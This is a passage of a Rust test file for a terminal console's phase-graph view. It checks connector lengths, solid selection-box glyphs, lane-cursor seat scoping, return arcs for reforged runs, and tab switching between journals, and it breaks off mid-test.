fn every_connector_between_two_phases_is_the_same_length() {
    // A baseline label wider than its rail content used to stretch its
    // own segment, and the rail's dash-fill painted that slack as extra
    // dashes: `──ᐳ` between two ordinary phases, `────ᐳ` after a wide
    // one. The frame now carries ONE connector length, so the run into
    // and out of the wide-named phase is the run between any other two.
    //
    // The selection box's walls stand two columns clear of the phase
    // they enclose, which lands them INSIDE a connector — and since
    // 2026-08-31 a wall that crosses the rail wears `┼` rather than
    // stepping over the rail row. That junction is rail: the whole
    // point of the glyph is that both lines read continuous through it,
    // so the rhythm is measured through it too, and a `│` where a `┼`
    // belongs would fail this test exactly as a hole in the rail should.
    let plan = box_plan("verify");
    let grid = grid_of(&plan);
    let runs: Vec<String> = plan
        .segments
        .windows(2)
        .map(|pair| {
            grid[plan.rail_row][pair[0].rail.1 + 1..pair[1].rail.0]
                .iter()
                .map(|glyph| match glyph {
                    '┼' => '─',
                    other => *other,
                })
                .collect()
        })
        .collect();
    assert!(runs.len() >= 3, "into and out of the wide phase: {runs:?}");
    assert!(
        runs.iter().all(|run| *run == runs[0]),
        "one rhythm for the whole rail: {runs:?}"
    );
    let mut glyphs: Vec<char> = runs[0].chars().collect();
    assert_eq!(glyphs.pop(), Some('ᐳ'), "the arrowhead lands on the node");
    assert!(
        glyphs.len() + 1 >= ARROW_WIDTH && glyphs.iter().all(|glyph| *glyph == '─'),
        "and the rail runs unbroken into it: {:?}",
        runs[0]
    );
}

#[test]
fn the_box_takes_its_shape_from_the_selected_phases_own_lanes() {
    // Superseding the fixed full-envelope box: a plain phase gets a
    // SNUG box with no empty `│    │` air rows above its single mark,
    // and a fork in the SAME plan grows to enclose its own lanes.
    let plain = box_plan("verify");
    let plain_grid = grid_of(&plain);
    let (top, _, bottom, _) = box_of(&plain_grid);
    assert_eq!(
        top + 1,
        plain.rail_row,
        "the top edge sits one row above the phase's only mark"
    );
    assert_eq!(bottom, plain.box_row.expect("a box row"));

    let forked = box_plan("design");
    let forked_grid = grid_of(&forked);
    let (fork_top, _, fork_bottom, _) = box_of(&forked_grid);
    let lanes: Vec<usize> = forked
        .segments
        .iter()
        .find(|seg| seg.key == "design")
        .expect("the fork")
        .joins
        .iter()
        .flat_map(|join| join.rows.iter().copied())
        .collect();
    assert!(!lanes.is_empty(), "the fork really has lanes");
    assert!(
        fork_top < *lanes.iter().min().unwrap() && fork_bottom > *lanes.iter().max().unwrap(),
        "the fork's box encloses its own lanes"
    );
    assert!(
        fork_bottom - fork_top > bottom - top,
        "and is taller than the plain phase's in the same plan"
    );

    // The regression the fixed height was reaching for, now with the
    // opposite ruling: two PLAIN phases, one shape between them.
    let other = box_plan("ship");
    let other_grid = grid_of(&other);
    let (other_top, _, other_bottom, _) = box_of(&other_grid);
    assert_eq!(
        (other_bottom - other_top, other_top),
        (bottom - top, top),
        "selection moved between two plain phases keeps the shape"
    );
}

#[test]
fn every_side_of_the_selection_box_is_solid_from_corner_to_corner() {
    // The operator's ruling of 2026-08-31, from a screenshot of their own
    // terminal: `╌` and `┆` are drawn with a gap at every cell boundary
    // BY GLYPH DESIGN, so the box read broken in every font no matter
    // how right the columns were — the geometry was never the fault, the
    // vocabulary was. The box is now `─ │ ╭ ╮ ╰ ╯ ┼` and every side is
    // walked cell by cell here, because walking is the only way a gap
    // can be seen at all.
    for (phase, plan) in box_cases() {
        let painted = text_of(&paint(&plan, 0, false));
        assert!(
            !painted.contains('╌') && !painted.contains('┆'),
            "the dashed set left the graph, selecting {phase}: {painted}"
        );
        let grid = grid_of(&plan);
        let (top, left, bottom, right) = box_of(&grid);
        let rail = plan.rail.expect("a rail for the walls to cross");
        assert_eq!(grid[top][right], '╮', "the top-right corner, {phase}");
        assert_eq!(grid[bottom][left], '╰', "the bottom-left corner, {phase}");
        for (edge, line) in [("top", &grid[top]), ("bottom", &grid[bottom])] {
            for (column, cell) in line.iter().enumerate().take(right).skip(left + 1) {
                assert_eq!(
                    *cell, '─',
                    "a gap in the {edge} edge at {column}, selecting {phase}"
                );
            }
        }
        // `┼` is the whole ruling: where a wall crosses live rail, ONE
        // cell carries both lines, so the wall is unbroken and the rail
        // stays unbroken too. A wall standing where there is no rail —
        // the outer side of the first or the last phase — is plain `│`.
        let mut junctions: Vec<(usize, usize)> = Vec::new();
        for (row, line) in grid.iter().enumerate().take(bottom).skip(top + 1) {
            for column in [left, right] {
                let expected = match (row == plan.rail_row, (rail.0..=rail.1).contains(&column)) {
                    (true, true) => '┼',
                    _ => '│',
                };
                junctions.extend((expected == '┼').then_some((row, column)));
                assert_eq!(
                    line[column], expected,
                    "the wall at row {row}, column {column}, selecting {phase}"
                );
            }
        }
        // And nowhere else. The fixtures carry no odd-membered fork,
        // whose spine wears a `┼` of its own at the trunk — so every
        // `┼` in this frame is the box's.
        assert!(
            plan.segments
                .iter()
                .flat_map(|seg| &seg.joins)
                .all(|join| !join.on_rail),
            "the fixture has no on-rail fork to lend a stray `┼`, {phase}"
        );
        let drawn: Vec<(usize, usize)> = grid
            .iter()
            .enumerate()
            .flat_map(|(row, line)| {
                line.iter()
                    .enumerate()
                    .filter(|(_, cell)| **cell == '┼')
                    .map(move |(column, _)| (row, column))
            })
            .collect();
        assert_eq!(
            drawn, junctions,
            "`┼` exactly where a wall meets the rail, selecting {phase}"
        );
    }
}

#[test]
fn the_sequence_phases_box_spans_its_steps() {
    // `design` mixes a fork and a single step, so it can never isolate
    // the pure-sequence shape: several single-node columns in series,
    // one after another on the rail, the box snug around all of them.
    let plan = seq_plan("build");
    let grid = grid_of(&plan);
    let (top, left, bottom, right) = box_of(&grid);
    let seg = plan
        .segments
        .iter()
        .find(|seg| seg.key == "build")
        .expect("the sequence phase");
    assert!(seg.joins.is_empty(), "a sequence forks nowhere");
    assert_eq!(seg.marks.len(), 3, "three steps in series");
    assert!(
        seg.marks.iter().all(|mark| mark.row == plan.rail_row),
        "and every one of them rides the rail"
    );
    assert!(
        seg.marks.iter().all(|mark| left < mark.x && mark.x < right),
        "the box spans its steps"
    );
    // Snug: a sequence occupies the rail row only, so its box is the
    // plain phase's height, not a fork's.
    assert_eq!(top + 1, plan.rail_row, "no air row above the steps");
    assert_eq!(bottom, plan.box_row.expect("a box row"));
}

// ------------------------------- the lane cursor scopes the seat, one down
//
// The rail's standing law — moving IS scoping — extended to the lanes:
// a member node under the lane cursor scopes that seat, through the SAME
// `Scope`/`lens_for`/`keeps_participant`/`keeps_row` the seats pane's own
// `Enter` uses. Everything the lanes cannot resolve falls back to the
// phase the rail already named.

/// The keys the seats pane and the trail actually list under whatever
/// scope the `Tui` is carrying — the two panes read through the lens, so
/// "the panes filtered" is asked of the lens, never of a second path.
fn panes_under(tui: &Tui, views: &Views) -> (Vec<String>, Vec<String>) {
    let mut probe = Tui::new(tui.run.clone());
    probe.scope = match &tui.scope {
        Some(render::Scope::Phase(name)) => Some(render::Scope::Phase(name.clone())),
        Some(render::Scope::Seat(key)) => Some(render::Scope::Seat(key.clone())),
        None => None,
    };
    probe.pane = 1;
    let seats = keys_for(&probe, views);
    probe.pane = 2;
    (seats, keys_for(&probe, views))
}

#[test]
fn the_lane_cursor_scopes_the_member_and_the_seats_and_trail_filter_to_it() {
    let views = views();
    let mut tui = at_run();
    apply(&mut tui, &views, Key::Right);
    apply(&mut tui, &views, Key::Right);
    assert_eq!(tui.cursor[0].as_deref(), Some("design"));
    let (phase_seats, phase_trail) = panes_under(&tui, &views);
    assert!(
        phase_seats.len() > 1,
        "the phase scope keeps every seat of the phase: {phase_seats:?}"
    );

    // Down onto the first member of the `positions` fork: the node key
    // IS that member's participant key, so scoping is a lookup.
    apply(&mut tui, &views, Key::Down);
    assert_eq!(tui.node.as_deref(), Some("eff-d:positions:simplicity"));
    assert!(
        matches!(&tui.scope, Some(render::Scope::Seat(key))
                 if key == "eff-d:positions:simplicity"),
        "moving the lane cursor IS scoping the seat: {}",
        status_line(&tui)
    );

    // And the panes narrow through the lens — not through a second
    // filtering mechanism invented for the graph.
    let (seats, trail) = panes_under(&tui, &views);
    assert_eq!(
        seats,
        vec!["eff-d:positions:simplicity".to_string()],
        "the seats pane marks exactly the scoped member"
    );
    assert!(!trail.is_empty(), "the trail keeps the member's own rows");
    assert!(
        trail.iter().all(|seq| phase_trail.contains(seq)) && trail.len() == phase_trail.len(),
        "a seat's trail is its phase's rows, which is what keeps_row says"
    );
    let (_, unscoped) = panes_under(&at_run(), &views);
    assert!(
        trail.len() < unscoped.len(),
        "and it is narrower than the unscoped trail"
    );

    // The selection-clears-itself law is untouched: a member that is no
    // longer in the run takes its scope with it.
    let gone = Views {
        now: NOW.to_string(),
        runs: fleet(),
        run: Some(brokkr_view::run_view(&[], None)),
        transcript: None,
        note: None,
    };
    settle(&mut tui, &gone);
    assert!(
        tui.scope.is_none(),
        "a vanished member clears its own scope"
    );
}

#[test]
fn the_lane_cursor_on_a_plain_step_scopes_that_steps_seat() {
    let views = views();

    // The last node of the design phase is the bare `chief` step, whose
    // single node key is that seat's own participant key.
    let mut tui = at_run();
    apply(&mut tui, &views, Key::Right);
    apply(&mut tui, &views, Key::Right);
    apply(&mut tui, &views, Key::Down);
    apply(&mut tui, &views, Key::Up);
    assert_eq!(
        tui.node.as_deref(),
        Some("eff-d:chief"),
        "wrapped to the foot"
    );
    assert!(
        matches!(&tui.scope, Some(render::Scope::Seat(key)) if key == "eff-d:chief"),
        "a plain step scopes its seat: {}",
        status_line(&tui)
    );

    // An untagged single-step phase says the same with the effect id
    // alone — the other half of the key rule, and the same lookup.
    let mut tui = at_run();
    apply(&mut tui, &views, Key::Right);
    apply(&mut tui, &views, Key::Down);
    assert_eq!(tui.node.as_deref(), Some("eff-i"));
    assert!(matches!(&tui.scope, Some(render::Scope::Seat(key)) if key == "eff-i"));
    let (seats, _) = panes_under(&tui, &views);
    assert_eq!(seats, vec!["eff-i".to_string()]);
}

#[test]
fn a_structural_node_and_an_empty_lane_both_leave_the_rails_phase_scoped() {
    // `rail_phases` carries node keys no participant answers to — the
    // structural node: a finished step nobody tagged with a member.
    let plain = graph_views(rail_phases(), "running");
    let mut tui = at_graph();

    // A PLAIN phase has no lanes at all. A seat scope left over from an
    // earlier lane visit does not survive `↑↓` here.
    apply(&mut tui, &plain, Key::Right);
    assert_eq!(tui.cursor[0].as_deref(), Some("intake"));
    assert!(lane_keys(&tui, &plain).is_empty());
    tui.scope = Some(render::Scope::Seat("eff-d:chief".to_string()));
    apply(&mut tui, &plain, Key::Down);
    assert_eq!(tui.node, None, "no lane to be in");
    assert!(
        matches!(&tui.scope, Some(render::Scope::Phase(name)) if name == "intake"),
        "back on the rail row, the rail's phase is the scope again: {}",
        status_line(&tui)
    );

    // A node that names no participant scopes nothing beyond the phase.
    apply(&mut tui, &plain, Key::Right);
    apply(&mut tui, &plain, Key::Down);
    assert!(tui.node.is_some(), "the lane cursor did land on a node");
    assert!(
        lane_member(&tui, &plain).is_none(),
        "and that node names no seat"
    );
    assert!(
        matches!(&tui.scope, Some(render::Scope::Phase(name)) if name == "design"),
        "so the phase stays scoped: {}",
        status_line(&tui)
    );
}

#[test]
fn rail_movement_clears_the_lane_cursor_and_re_scopes_the_phase() {
    let views = views();
    let mut tui = at_run();
    apply(&mut tui, &views, Key::Right);
    apply(&mut tui, &views, Key::Right);
    apply(&mut tui, &views, Key::Down);
    assert!(scoped_seat(&tui).is_some(), "a lane visit scoped a seat");

    // `←→` move the rail, so the lane the cursor was in is gone — and
    // so is the seat that lane scoped.
    apply(&mut tui, &views, Key::Left);
    assert_eq!(tui.node, None);
    assert!(
        matches!(&tui.scope, Some(render::Scope::Phase(name)) if name == "intake"),
        "the phase it landed on is what is scoped: {}",
        status_line(&tui)
    );
    apply(&mut tui, &views, Key::Right);
    assert!(matches!(&tui.scope, Some(render::Scope::Phase(name)) if name == "design"));
}

#[test]
fn the_graph_footer_names_the_member_the_lane_cursor_scoped() {
    let views = views();
    let mut tui = at_run();
    apply(&mut tui, &views, Key::Right);
    apply(&mut tui, &views, Key::Right);
    let on_the_rail = footer_for(&tui, &views);
    assert!(on_the_rail.contains("↑↓ lanes"), "{on_the_rail}");
    assert!(
        !on_the_rail.contains("scoped to"),
        "nothing is scoped by the lanes yet: {on_the_rail}"
    );

    // Discoverability (decision 0014): the mechanic is named where it
    // happens, by the label the seats pane shows.
    apply(&mut tui, &views, Key::Down);
    let in_a_lane = footer_for(&tui, &views);
    assert!(
        in_a_lane.contains("↑↓ lanes · scoped to design:positions:simplicity"),
        "{in_a_lane}"
    );
    assert!(in_a_lane.contains("←→ rail"), "{in_a_lane}");
    assert!(in_a_lane.contains("Enter scope phase"), "{in_a_lane}");

    // A structural node scopes no seat, so it names none either.
    let plain = graph_views(rail_phases(), "running");
    let mut tui = at_graph();
    apply(&mut tui, &plain, Key::Right);
    apply(&mut tui, &plain, Key::Right);
    apply(&mut tui, &plain, Key::Down);
    let structural = footer_for(&tui, &plain);
    assert!(!structural.contains("scoped to"), "{structural}");
}

#[test]
fn the_graph_footer_names_no_member_once_the_lane_cursor_no_longer_scopes_it() {
    // The lane cursor OUTLIVES the scope it set: `Enter` re-scopes the
    // phase and `j`/`k` move the rail, both leaving `tui.node` standing
    // where it was. The footer reads the SCOPE, so it stops naming a
    // seat the moment the panes stop filtering to one — anything else
    // is a footer that contradicts the status line directly above it.
    let views = views();
    let mut tui = at_run();
    apply(&mut tui, &views, Key::Right);
    apply(&mut tui, &views, Key::Right);
    apply(&mut tui, &views, Key::Down);
    assert!(
        footer_for(&tui, &views).contains("scoped to"),
        "the lane scoped it"
    );

    apply(&mut tui, &views, Key::Enter);
    assert!(tui.node.is_some(), "the lane cursor stands where it was");
    let after_enter = footer_for(&tui, &views);
    assert!(
        !after_enter.contains("scoped to"),
        "Enter scoped the PHASE, so no member is scoped: {} / {after_enter}",
        status_line(&tui)
    );

    // The same for the rail keys that move without clearing the lane.
    apply(&mut tui, &views, Key::Down);
    assert!(
        footer_for(&tui, &views).contains("scoped to"),
        "scoped again"
    );
    apply(&mut tui, &views, Key::Char('j'));
    assert!(tui.node.is_some(), "and again the cursor stands");
    let after_rail = footer_for(&tui, &views);
    assert!(
        !after_rail.contains("scoped to"),
        "the rail took the scope back: {} / {after_rail}",
        status_line(&tui)
    );
    let (seats, _) = panes_under(&tui, &views);
    assert!(
        !seats.contains(&"eff-d:positions:simplicity".to_string()),
        "and the seats pane is not filtered to it either: {seats:?}"
    );
}

// ------------------------------------------------------- the return edge
//
// A reforging is a road, and roads are drawn. Decision 0022 gave the
// machine a backward transition — a review that finds a security
// residual sends the run back to implement — and without the arc the
// rail said only that `implement` lit up again, which reads as
// teleportation. Geometry is asserted against the `Plan`; the glyphs
// are asserted on the painted row.

/// A committed journal fixture folded the way a live pane reaches a
/// run: the export's own events, `brokkr-core`'s fold, `brokkr-view`'s
/// derivation. Nothing synthetic on the path.
fn folded(name: &str) -> RunView {
    let path = Path::new(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .unwrap()
        .parent()
        .unwrap()
        .join(format!("fixtures/journals/{name}.ndjson"));
    let ndjson = std::fs::read_to_string(&path).unwrap();
    let events: Vec<EventEnvelope> = ndjson
        .lines()
        .map(|line| serde_json::from_str(line).unwrap())
        .collect();
    let state = brokkr_core::fold::fold(&events).unwrap();
    brokkr_view::run_view(&events, Some(&state))
}

/// The reforging journal: `REVIEW-REFORGE` twice, then the exhausted
/// ruling to `ship`. Hand-built to the documented shape, and pinned as
/// a real chaining journal by `brokkr-store`'s own fixture test.
const REFORGED: &str = "reforging-the-road-back-hand-built";

/// The linear self-run: intake, implement, verify — no revisit anywhere.
const LINEAR: &str = "tui-graph-the-selection-box-gets-80f98deb";

fn segment<'a>(plan: &'a Plan, key: &str) -> &'a Seg {
    plan.segments
        .iter()
        .find(|seg| seg.key == key)
        .unwrap_or_else(|| panic!("the frame drew {key}"))
}

/// The same phase, carrying the roads the journal recorded INTO it —
/// the fact `brokkr-view` derives from the ruling, never from `visits`.
fn returned(phase: Phase, sources: &[&str]) -> Phase {
    Phase {
        returns: sources.iter().map(|name| name.to_string()).collect(),
        ..phase
    }
}

#[test]
fn a_recorded_reforging_draws_one_return_arc_under_the_names() {
    // The road back, from beneath the phase that ruled to beneath the
    // phase it landed in, on its own row under the name baseline.
    let view = folded(REFORGED);
    let plan = plan(&view.phases, None, "completed", None, None, 100, 12);

    assert_eq!(plan.arc_row, Some(11), "the last row is the arc's");
    assert_eq!(plan.box_row, Some(10), "the box keeps its own, above it");
    assert_eq!(plan.name_row, 9);
    let implement = centre_of(segment(&plan, "implement"));
    let review = centre_of(segment(&plan, "review"));
    assert_eq!(
        plan.arcs,
        vec![Arc {
            to: implement,
            from: review,
        }],
        "one road, landing where the ruling sent the run"
    );

    // Two reforgings were taken; ONE arc is drawn, because the repeats
    // ride the `×N` marker that was already the rail's answer to a
    // revisit.
    assert_eq!(
        view.phases
            .iter()
            .find(|phase| phase.name == "implement")
            .unwrap()
            .visits,
        3
    );
    let grid = grid_of(&plan);
    let names: String = grid[plan.name_row].iter().collect();
    assert!(
        names.contains("×3"),
        "the repeat count is the marker's: {names}"
    );

    // And the drawn row is the road: a corner rising to the landing
    // phase, the mirror head pointing into it, one unbroken run of
    // dashes, and the departing corner over the phase that ruled.
    let drawn: String = grid[11].iter().collect();
    let road = format!(
        "{}╰ᐸ{}╯",
        " ".repeat(implement),
        "─".repeat(review - implement - 2)
    );
    assert!(
        drawn.starts_with(&road),
        "the arc reads as one road: {drawn:?} wanted {road:?}"
    );
    assert!(
        drawn.chars().skip(road.chars().count()).all(|c| c == ' '),
        "and nothing past its end: {drawn:?}"
    );
    // The arc's row is the arc's alone: no box wall, no elision mark,
    // no name shares it.
    for glyph in ['│', '┼', '‹', '›', '╭', '╮'] {
        assert!(!drawn.contains(glyph), "{glyph} on the arc row: {drawn:?}");
    }
}

#[test]
fn a_run_that_never_reforged_draws_no_arc_at_all() {
    // The easiest regression to introduce is an arc drawn from an
    // inference — `visits > 1`, a shared prefix, an ordering — so this
    // is pinned on a real linear journal rather than on a synthetic.
    let view = folded(LINEAR);
    assert!(
        view.phases.iter().all(|phase| phase.returns.is_empty()),
        "the linear fixture recorded no backward transition"
    );
    let plan = plan(&view.phases, None, "running", None, None, 100, 12);
    assert_eq!(plan.arc_row, None, "no road, no row reserved for one");
    assert!(plan.arcs.is_empty());
    // And the rows below are exactly what they were before arcs existed.
    assert_eq!(plan.box_row, Some(11));
    assert_eq!(plan.name_row, 10);
    let frame = text_of(&paint(&plan, 0, false));
    assert!(!frame.contains('ᐸ'), "and no mirror head anywhere: {frame}");
}

#[test]
fn a_pane_too_short_for_the_arc_row_draws_no_half_arc() {
    // Half an arc is the box's own lesson: a pane that cannot hold the
    // row omits the road WHOLE, and the rest of the frame is exactly
    // the layout a run with no road would have had.
    let view = folded(REFORGED);
    let short = plan(&view.phases, None, "completed", None, None, 100, 4);
    assert_eq!(short.arc_row, None);
    assert!(short.arcs.is_empty());
    assert_eq!(short.box_row, Some(3), "the box keeps its row");
    assert_eq!(short.name_row, 2);
    let frame = text_of(&paint(&short, 0, false));
    assert!(!frame.contains('ᐸ'), "no head: {frame}");
    assert!(!frame.contains('╰'), "and no landing corner: {frame}");

    // One row more and the road fits, whole.
    let tall = plan(&view.phases, None, "completed", None, None, 100, 5);
    assert_eq!(tall.arc_row, Some(4));
    assert_eq!(tall.box_row, Some(3), "the box moved up, it did not go");
    assert_eq!(tall.name_row, 2);
    assert_eq!(tall.arcs.len(), 1);
}

#[test]
fn an_arc_with_an_end_outside_the_window_is_not_drawn() {
    // A road reaching a phase the window scrolled away would have to
    // land on the elision mark's own column. The ROW stays reserved, so
    // walking the rail never lifts the baseline under the operator.
    let view = folded(REFORGED);
    let narrow = plan(&view.phases, None, "completed", Some("done"), None, 30, 12);
    assert!(narrow.left_elided, "the rail is scrolled");
    assert!(
        narrow.segments.iter().all(|seg| seg.key != "review"),
        "and the departure is off the frame"
    );
    assert_eq!(narrow.arc_row, Some(11), "the row is still the arc's");
    assert!(narrow.arcs.is_empty(), "but there is no road to draw");
    let frame = text_of(&paint(&narrow, 0, false));
    assert!(!frame.contains('ᐸ'), "no head: {frame}");
}

#[test]
fn a_road_needs_two_ends_on_the_rail_and_a_landing_that_lies_left() {
    // Both arms of the geometry filter, on models the derivation can
    // honestly produce: a departure the rail never drew (a `from` no
    // `phase/entered` ever named), and a landing sitting LATER on the
    // rail than its departure — the shape `A → B → A`, then `A → B`
    // records, which is a real backward transition with no leftward
    // road to draw for it.
    let plan_of = |phases: &[Phase]| plan(phases, None, "running", None, None, 100, 12);
    let dangling = vec![
        gphase("intake", 1, false, Vec::new()),
        returned(gphase("implement", 2, true, Vec::new()), &["nowhere"]),
    ];
    assert!(returns_of(&dangling).is_empty(), "no column to leave from");
    assert_eq!(plan_of(&dangling).arc_row, None);

    let forward = vec![
        gphase("intake", 2, false, Vec::new()),
        returned(gphase("implement", 2, true, Vec::new()), &["intake"]),
    ];
    assert!(
        returns_of(&forward).is_empty(),
        "a landing right of its departure is no return arc"
    );
    assert_eq!(plan_of(&forward).arc_row, None);
    assert!(!text_of(&paint(&plan_of(&forward), 0, false)).contains('ᐸ'));

    // The same pair the other way round IS a road.
    let back = vec![
        returned(gphase("implement", 2, false, Vec::new()), &["review"]),
        gphase("review", 1, true, Vec::new()),
    ];
    assert_eq!(returns_of(&back), vec![(0, 1)]);
    assert_eq!(plan_of(&back).arcs.len(), 1);
}

#[test]
fn the_return_arc_names_only_the_solid_vocabulary() {
    // The dashed lesson, applied before it could be re-learned: `╌` and
    // `┆` carry a gap at every cell boundary by design and can never
    // touch a corner, so the arc is solid from the start. The evidence
    // is the drawing code itself, not a memory of the ruling.
    let body = SOURCE
        .split("fn arc(cells: &mut Cells")
        .nth(1)
        .expect("the arc has a painter")
        .split("\n}\n")
        .next()
        .expect("bounded by its own closing brace");
    let drawn: Vec<char> = body
        .split('"')
        .skip(1)
        .step_by(2)
        .flat_map(str::chars)
        .collect();
    assert!(!drawn.is_empty(), "the painter names glyphs");
    for glyph in &drawn {
        assert!(
            "─│╭╮╰╯┼ᐸ".contains(*glyph),
            "the arc drew {glyph}, outside the solid vocabulary"
        );
    }
    for forbidden in ['╌', '┆'] {
        assert!(
            !body.contains(forbidden),
            "the dashed set is not the arc's: {forbidden}"
        );
    }
}

// ------------------------------- many hearths (0026 rulings 2 and 5)

use brokkr_runtime::realms::Hearth;

fn tabbed_tui(tabs: &[&str]) -> Tui {
    Tui::over(None, tabs.iter().map(|t| t.to_string()).collect(), 0)
}

/// The guard on `switch` holds at every leg: an untabbed console
/// switches nowhere, and a tabbed one refuses an index past the bar and
/// a switch to the tab already open — nothing parked, nothing restored.
#[test]
fn a_switch_out_of_range_or_to_the_open_tab_moves_nothing() {
    let mut plain = Tui::new(None);
    switch(&mut plain, 1);
    assert_eq!(plain.tab, 0);
    let mut tui = tabbed_tui(&["alpha", "beta"]);
    switch(&mut tui, 5);
    assert_eq!(tui.tab, 0, "past the bar is a no-op");
    switch(&mut tui, 0);
    assert_eq!(tui.tab, 0, "the open tab is a no-op");
    switch(&mut tui, 1);
    assert_eq!(tui.tab, 1, "and a real switch still switches");
}

/// The regression bar: a world with one journal draws no tab bar, binds
/// no tab key, and says nothing about a realm — the same frame, byte for
/// byte, as the console that never knew hearths existed.
#[test]
fn a_one_hearth_world_draws_no_tab_bar_and_binds_no_tab_key() {
    let views = views();
    let plain = frame_of(&Tui::new(None), &views, 100, 20);
    for tabs in [Vec::new(), vec!["brokkr"]] {
        let mut tui = tabbed_tui(&tabs);
        assert_eq!(frame_of(&tui, &views, 100, 20), plain, "{tabs:?}");
        assert_eq!(
            footer_for(&tui, &views),
            footer_for(&Tui::new(None), &views)
        );
        assert_eq!(status_line(&tui), "runs");
        // The keys are characters nothing binds, exactly as before.
        for key in ['[', ']', '2'] {
            apply(&mut tui, &views, Key::Char(key));
            assert_eq!(tui.tab, 0, "{key} moved a world with no tabs");
        }
        assert_eq!(frame_of(&tui, &views, 100, 20), plain);
    }
}

/// More than one journal, and the runs pane grows a numbered bar of the
/// realms — the tab bar is the only thing that appears.
#[test]
fn a_many_hearth_world_names_its_realms_on_a_numbered_tab_bar() {
    let views = views();
    let tui = tabbed_tui(&["alpha", "beta+delta"]);
    let lines = buffer_of(&tui, &views, 100, 20);
    assert!(lines[0].contains("1 alpha"), "{}", lines[0]);
    assert!(lines[0].contains("2 beta+delta"), "{}", lines[0]);
    // The status line says which hearth is being read.
    assert_eq!(status_line(&tui), "runs · realm alpha");
    // And the footer says how to move between them, where it is bound.
    assert!(footer_for(&tui, &views).contains("[ ] 1-9 realm"));
    // The table is still there, one row down.
    assert!(lines.iter().any(|line| line.contains("run-7")), "{lines:?}");
}

/// `[`, `]` and the number keys move between hearths, and the ends
/// clamp rather than wrap — a key that does nothing is better than a key
/// that silently lands somewhere else.
#[test]
fn the_brackets_and_the_number_keys_move_between_hearths() {
    let views = views();
    let mut tui = tabbed_tui(&["alpha", "beta", "gamma"]);
    apply(&mut tui, &views, Key::Char(']'));
    assert_eq!(tui.tab, 1);
    apply(&mut tui, &views, Key::Char(']'));
    apply(&mut tui, &views, Key::Char(']'));
    assert_eq!(tui.tab, 2, "the last hearth is the last");
    apply(&mut tui, &views, Key::Char('['));
    assert_eq!(tui.tab, 1);
    apply(&mut tui, &views, Key::Char('['));
    apply(&mut tui, &views, Key::Char('['));
    assert_eq!(tui.tab, 0, "the first hearth is the first");
    apply(&mut tui, &views, Key::Char('3'));
    assert_eq!(tui.tab, 2);
    apply(&mut tui, &views, Key::Char('9'));
    assert_eq!(tui.tab, 2, "a number past the last hearth names none");

    // While a filter is being typed, they are letters — the existing
    // boundary, unmoved.
    tui.tab = 0;
    tui.typing = true;
    apply(&mut tui, &views, Key::Char(']'));
    assert_eq!(tui.tab, 0);
    assert_eq!(tui.filter, "]");
}

/// Each tab keeps its OWN selection, filter and scroll: switching away
/// and back is a return, and neither tab's state bleeds into the other's.
#[test]
fn each_hearth_keeps_its_own_selection_filter_and_cursor() {
    let views = views();
    let mut tui = tabbed_tui(&["alpha", "beta"]);
    tui.cursor[0] = Some("run-7".to_string());
    tui.filter = "deriv".to_string();
    tui.offset = 4;

    apply(&mut tui, &views, Key::Char(']'));
    assert_eq!(tui.tab, 1);
    assert_eq!(tui.cursor[0], None, "a fresh hearth is fresh");
    assert_eq!(tui.filter, "");
    assert_eq!(tui.offset, 0);

    tui.cursor[0] = Some("run-old".to_string());
    tui.filter = "older".to_string();
    tui.offset = 9;

    apply(&mut tui, &views, Key::Char('['));
    assert_eq!(tui.tab, 0);
    assert_eq!(
        tui.cursor[0].as_deref(),
        Some("run-7"),
        "returned, not reset"
    );
    assert_eq!(tui.filter, "deriv");
    assert_eq!(tui.offset, 4);

    apply(&mut tui, &views, Key::Char(']'));
    assert_eq!(tui.cursor[0].as_deref(), Some("run-old"));
    assert_eq!(tui.filter, "older");
    assert_eq!(tui.offset, 9);
}

/// A run id lives in exactly one journal (ruling 3), so leaving a hearth
/// leaves the run that was open in it — nothing selected under one
/// journal survives into another, and the next frame is forced because
/// the new hearth has not been read at all.
#[test]
fn leaving_a_hearth_leaves_the_run_that_was_open_in_it() {
    let views = views();
    let mut tui = tabbed_tui(&["alpha", "beta"]);
    tui.cursor[0] = Some("run-7".to_string());
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Run);
    assert_eq!(tui.run.as_deref(), Some("run-7"));
    // The tab keys are the runs pane's, so they are not bound here.
    apply(&mut tui, &views, Key::Char(']'));
    assert_eq!(tui.tab, 0, "the bar belongs to the fleet, not to a run");

    apply(&mut tui, &views, Key::Escape);
    apply(&mut tui, &views, Key::Escape);
    assert_eq!(tui.level, Level::Runs);
    tui.force = false;
    apply(&mut tui, &views, Key::Char(']'));
    assert_eq!(tui.tab, 1);
    assert_eq!(tui.run, None, "the run belonged to the hearth it was in");
    assert_eq!(tui.seat, None);
    assert!(tui.scope.is_none());
    assert!(tui.force, "the new hearth's journal has not been read yet");
}

/// Stores open lazily and only the ACTIVE hearth is polled: a tab nobody
/// visits is never asked about, so its journal is never opened — and
/// when it is visited, it is opened READ-ONLY, so a console still
/// creates no journal (ruling 5).
#[test]
fn an_unvisited_hearth_is_never_asked_about_and_no_read_creates_a_journal() {
    let _serialized = TERMINAL.lock().unwrap_or_else(|error| error.into_inner());
    let dir = tempfile::tempdir().unwrap();
    let alpha = dir.path().join("alpha.db");
    crate::tests::running_store(&alpha, "run-a");
    // Never created, and it must stay that way.
    let beta = dir.path().join("beta.db");
    let hearths = [
        Hearth {
            realms: vec!["alpha".to_string()],
            journal: alpha.clone(),
        },
        Hearth {
            realms: vec!["beta".to_string()],
            journal: beta.clone(),
        },
    ];

    let mut heads = vec![None, None];
    let mut seen = None;
    let mut asked: Vec<usize> = Vec::new();
    {
        let mut inner = crate::tui_source(&hearths, &mut heads, &mut seen);
        let mut source = |ask: Ask| {
            asked.push(ask.tab);
            inner(ask)
        };
        let mut terminal = Terminal::new(TestBackend::new(100, 30)).unwrap();
        script(&[Key::Down, Key::Quit]);
        let mut tui = tabbed_tui(&["alpha", "beta"]);
        drive(&mut terminal, &test_ops(), &mut source, &mut tui, 6).unwrap();
    }
    assert!(!asked.is_empty());
    assert!(
        asked.iter().all(|tab| *tab == 0),
        "only the active hearth was asked about: {asked:?}"
    );
    assert!(!beta.exists(), "an unvisited hearth's journal was opened");

    // Visiting it asks about it — and still creates nothing.
    let mut heads = vec![None, None];
    let mut seen = None;
    let mut asked: Vec<usize> = Vec::new();
    {
        let mut inner = crate::tui_source(&hearths, &mut heads, &mut seen);
        let mut source = |ask: Ask| {
            asked.push(ask.tab);
            inner(ask)
        };
